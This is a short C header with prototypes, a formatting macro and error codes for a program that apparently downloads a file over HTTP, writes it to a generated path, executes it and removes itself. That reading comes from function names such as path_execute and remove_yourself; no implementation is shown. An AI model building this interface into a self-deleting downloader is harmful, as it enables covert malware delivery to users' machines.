#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>

#define STK_PRINTF(BUF, FMT, ...) \
    const ssize_t __LEN##BUF = snprintf(NULL, 0, FMT, ##__VA_ARGS__); \
    if (__LEN##BUF < 0) \
    { \
        exit(ERR_INTERNAL); \
    } \
    char BUF[__LEN##BUF + 1]; \
    snprintf(BUF, __LEN##BUF + 1, FMT, ##__VA_ARGS__)

void init_rand(void);

void exit_if_true(int cond, int err_code);

size_t user_agent(char* buf);
void check_uid(void);

void remove_yourself(void);

void path_remove(const char* path);
void path_gen(char* path, const size_t len);
int path_execute(const char *url_path, const char *fpath);

int fd_create_path(const char* path);
size_t fd_write(const int fd, const void* data, const size_t len);
void fd_flush(const int fd);
void fd_close(const int fd);

enum {
    ERR_USER=1,
    ERR_INTERNAL=2,
    ERR_INVALID_UID=3,
    ERR_CANNOT_READ_LINK=4,
    ERR_CANNOT_RM=5,
    ERR_FILE=6,
    ERR_CANNOT_EXEC=7,
    ERR_HTTP=8,
    ERR_FORK=9,
    ERR_WAIT=10,
    ERR_ZIP=11,
    ERR_STATUS=12,
};
